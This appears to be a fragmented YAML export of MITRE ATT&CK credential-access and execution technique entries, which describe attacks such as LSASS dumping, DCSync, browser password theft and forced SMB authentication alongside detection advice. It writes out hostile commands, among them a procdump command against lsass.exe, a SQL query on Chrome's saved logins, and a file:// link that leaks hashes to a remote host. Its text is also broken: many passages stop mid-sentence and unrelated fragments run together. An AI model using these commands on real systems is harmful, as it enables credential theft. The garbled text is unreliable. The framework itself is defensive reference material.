        and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted
        by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.\nWindows
        10 adds protections for LSA Secrets described in Mitigation.\n\n#### NTDS
        from Domain Controller\n\nActive Directory stores information about members
        of the domain including devices and users to verify credentials and define
        access rights. The Active Directory domain database is stored in the NTDS.dit
        file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit
        of a domain controller. (Citation: Wikipedia Active Directory)\n \nThe following
        tools and techniques can be used to enumerate the NTDS file and the contents
        of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n*
        Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n####
        Group Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are
        tools that allowed administrators to create domain policies with embedded
        credentials. These policies, amongst other things, allow administrators to
        set local accounts.\n\nThese group policies are stored in SYSVOL on a domain
        controller, this means that any domain user can view the SYSVOL share and
        decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft
        GPP Key) (Citation: SRD GPP)\n\nThe following tools and scripts can be used
        to gather and decrypt the password file from Group Policy Preference XML files:\n\n*
        Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n*
        Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nNotes:\nOn
        the SYSVOL share, the following can be used to enumerate potential XML files.\ndir

        Plaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials
        are generated and stored in the Local Security Authority Subsystem Service (LSASS)
        process in memory. These credentials can be harvested by a administrative
        user or SYSTEM.\n\nSSPI (Security Support Provider Interface) functions as

        [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAs well as in-memory
        techniques, the LSASS process memory can be dumped from the target host and
        analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n*
        <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be

        DCSync\n\nDCSync is a variation on credential dumping which can be used to
        acquire sensitive information from a domain controller. Rather than executing
        recognizable malicious code, the action works by abusing the domain controller's
        \ application programming interface (API) (Citation: Microsoft DRSR Dec 2017)
        (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine
        API samlib.dll) to simulate the replication process from a remote domain controller.
        Any members of the Administrators, Domain Admins, Enterprise Admin groups
        or computer accounts on the domain controller are able to run DCSync to pull
        password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory,
        which may include current and historical hashes of potentially useful accounts
        such as KRBTGT and Administrators. The hashes can then in turn be used to
        create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097)
        (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as
        noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).
        (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been
        included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz
        lsadump Module) Lsadump also includes NetSync, which performs DCSync over
        a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\n###
        Linux\n\n#### Proc filesystem\n\nThe /proc filesystem on Linux contains a
        great deal of information regarding the state of the running operating system.
        Processes running with root privileges can use this facility to scrape live
        memory of other running programs. If any of these programs store passwords
        in clear text or password hashes in memory, these values can then be harvested
        for either usage or brute force attacks, respectively. This functionality
        has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179),
        an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002).
        The tool dumps process memory, then harvests passwords and hashes by looking
        for text strings and regex patterns for how given applications such as Gnome
        Keyring, sshd, and Apache use memory to store such authentication artifacts."

        Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002)
        access the LSA Subsystem Service (LSASS) process by opening the process, locating
        the LSA secrets key, and decrypting the sections in memory where credential
        details are stored. Credential dumpers may also use methods for reflective
        [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential
        indicators of malicious activity.\n\nHash dumpers open the Security Accounts
        Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM)
        or create a dump of the Registry SAM key to access stored account password
        hashes. Some hash dumpers will open the local file system as a device and
        parse to the SAM table to avoid file access defenses. Others will make an
        in-memory copy of the SAM table before reading hashes. Detection of compromised
        [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries

        in memory, processes must open a maps file in the /proc filesystem for the
        process being analyzed. This file is stored under the path <code>/proc/<pid>/maps</code>,
        where the <code><pid></code> directory is the unique pid of the program being
        interrogated for such authentication data. The AuditD monitoring tool, which
        ships stock in many Linux distributions, can be used to watch for hostile
        processes opening this file in the proc file system, alerting on the pid,
        process name, and arguments of such programs."

      name: Credentials from Web Browsers
      description: "Adversaries may acquire credentials from web browsers by reading
        files specific to the target browser.  (Citation: Talos Olympic Destroyer
        2018) \n\nWeb browsers commonly save credentials such as website usernames
        and passwords so that they do not need to be entered manually in the future.
        Web browsers typically store the credentials in an encrypted format within
        a credential store; however, methods exist to extract plaintext credentials
        from web browsers.\n\nFor example, on Windows systems, encrypted credentials
        may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User
        Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url,
        username_value, password_value FROM logins;</code>. The plaintext password
        can then be obtained by passing the encrypted credentials to the Windows API
        function <code>CryptUnprotectData</code>, which uses the victim’s cached logon
        credentials as the decryption key. (Citation: Microsoft CryptUnprotectData
        ‎April 2018)\n \nAdversaries have executed similar procedures for common web
        browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential
        Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)\n\nAdversaries
        may also acquire credentials by searching web browser process memory for patterns
        that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter
        acquiring credentials from web browsers, adversaries may attempt to recycle
        the credentials across different systems and/or accounts in order to expand
        access. This can result in significantly furthering an adversary's objective
        in cases where credentials gained from web browsers overlap with privileged
        accounts (e.g. domain administrator)."

        Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

        It is possible to extract passwords from backups or saved virtual machines through [Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

        In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.

      name: Forced Authentication
      description: |-
        The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)

        Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information including the user's hashed credentials over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)

        There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:

        * A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)
        * A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)

        Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.

        Monitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)

      description: "Windows processes often leverage application programming interface
        (API) functions to perform tasks that require reusable system resources. Windows
        API functions are typically stored in dynamic-link libraries (DLLs) as exported
        functions. \n\nHooking involves redirecting calls to these functions and can
        be implemented via:\n\n* **Hooks procedures**, which intercept and execute
        designated code in response to events such as messages, keystrokes, and mouse
        inputs. (Citation: Microsoft Hook Overview) (Citation: Endgame Process Injection
        July 2017)\n* **Import address table (IAT) hooking**, which use modifications
        to a process’s IAT, where pointers to imported API functions are stored. (Citation:
        Endgame Process Injection July 2017) (Citation: Adlice Software IAT Hooks
        Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**,
        which overwrites the first bytes in an API function to redirect code flow.
        (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge
        Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nSimilar
        to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries
        may use hooking to load and execute malicious code within the context of another
        process, masking the execution while also allowing access to the process's
        memory and possibly elevated privileges. Installing hooking mechanisms may
        also provide Persistence via continuous invocation when the functions are
        called through normal use.\n\nMalicious hooking mechanisms may also capture
        API calls that include parameters that reveal user authentication credentials
        for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept
        2017)\n\nHooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s
        to conceal files, processes, Registry keys, and other objects in order to
        hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)"

        Monitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure. (Citation: Microsoft Hook Overview) (Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools  (Citation: Volatility Detecting Hooks Sept 2012) (Citation: PreKageo Winhook Jul 2011) (Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures. (Citation: Zairon Hooking Dec 2006) (Citation: EyeofRa Detecting Hooking June 2017)

        Rootkits detectors  (Citation: GMER Rootkits) can also be used to monitor for various flavors of hooking activity.

        Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  (Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.

        Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.

        Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

        Keylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

        Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.

        Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsyncKeyState. (Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.

        Monitor the Registry for the addition of a Custom Credential Provider. (Citation: Wrightson 2012) Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in use by adversaries may help to catch the result of user input interception if new techniques are used.

        Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)

        Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.

        Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.

        To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.

        Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)

        Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)

        Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)

      description: |-
        Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

        Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

        Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.

      x_mitre_detection: Detecting the events leading up to sniffing network traffic
        may be the best method of detection. From the host level, an adversary would
        likely need to perform a man-in-the-middle attack against other devices on
        a wired network in order to capture traffic that was not to or from the current
        compromised system. This change in the flow of information is detectable at
        the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts.
        Detecting compromised network devices is a bit more challenging. Auditing
        administrator logins, configuration changes, and device images is required
        to detect malicious changes.

      description: |-
        Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.

        Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.

        Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.

        In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. (Citation: OS X Keychain)

        If an adversary can obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X Keychain) (Citation: OSX Keydnap malware)

        is one commonly implemented framework that issues tokens to users for access
        to systems. An application desiring access to cloud-based services or protected
        APIs can gain entry using OAuth 2.0 through a variety of authorization protocols.
        An example commonly-used sequence is Microsoft's Authorization Code Grant
        flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation:
        Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token
        enables a third-party application to interact with resources containing user
        data in the ways requested by the application without obtaining user credentials.
        \n \nAdversaries can leverage OAuth authorization by constructing a malicious
        application designed to be granted access to resources with the target user's
        OAuth token. The adversary will need to complete registration of their application
        with the authorization server, for example Microsoft Identity Platform using
        Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell,
        or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019)
        Then, they can send a link through [Spearphishing Link](https://attack.mitre.org/techniques/T1192)

        Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a “High severity app permissions” policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.

        Security analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old “Last authorized” fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.

        Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.

      name: Steal Web Session Cookie
      description: |-
        An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

        Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)

        There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Mauraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

        After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1506) technique to login to the corresponding web application.

      name: Two-Factor Authentication Interception
      description: |-
        Use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. Adversaries may target authentication mechanisms, such as smart cards, to gain access to systems, services, and network resources.

        If a smart card is used for two-factor authentication (2FA), then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)

        Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)

        Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)

      x_mitre_detection: |-
        Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.

        Similar to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.

        Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).

        Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.

        Monitor and analyze activity related to items associated with CPL files, such as the Windows Control Panel process binary (control.exe) and the Control_RunDLL and ControlRunDLLAsUser API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before [Rundll32](https://attack.mitre.org/techniques/T1085) is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https://attack.mitre.org/techniques/T1085) command, which may bypass detections and/or execution filters for control.exe. (Citation: TrendMicro CPL Malware Jan 2014)

        Inventory Control Panel items to locate unregistered and potentially malicious files present on systems:

        * Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace</code> and <code>HKEY_CLASSES_ROOT\CLSID\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)
        * CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>Cpls</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec("c:\windows\system32\control.exe {Canonical_Name}", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>). (Citation: Microsoft Implementing CPL)
        * Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder\{name}\Shellex\PropertySheetHandlers</code> where {name} is the predefined name of the system item. (Citation: Microsoft Implementing CPL)

        Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.

      description: |-
        Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

        Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)

        Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.

      name: Exploitation for Client Execution
      description: |-
        Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

        Several types exist:

        ### Browser-based Exploitation

        Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1192). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

        ### Office Applications

        Common office and productivity applications such as Microsoft Office are also targeted through [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193), [Spearphishing Link](https://attack.mitre.org/techniques/T1192), and [Spearphishing via Service](https://attack.mitre.org/techniques/T1194). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

        ### Common Third-party Applications

        Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.

      x_mitre_detection: Detecting software exploitation may be difficult depending
        on the tools available. Also look for behavior on the endpoint system that
        might indicate successful compromise, such as abnormal behavior of the browser
        or Office processes. This could include suspicious files written to disk,
        evidence of [Process Injection](https://attack.mitre.org/techniques/T1055)
        for attempts to hide execution, evidence of Discovery, or other unusual network
        traffic that may indicate additional tools transferred to the system.

        InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft.

        Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>.

        history of known good arguments and executed binaries to determine anomalous
        and potentially adversarial activity. Command arguments used before and after
        the InstallUtil.exe invocation may also be useful in determining the origin
        and purpose of the binary being executed.

        The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)

        Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [DLL Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.

      description: |-
        On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

        ### cron

        System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.

        Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

        ### at

        The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

        ### launchd

        Each launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.

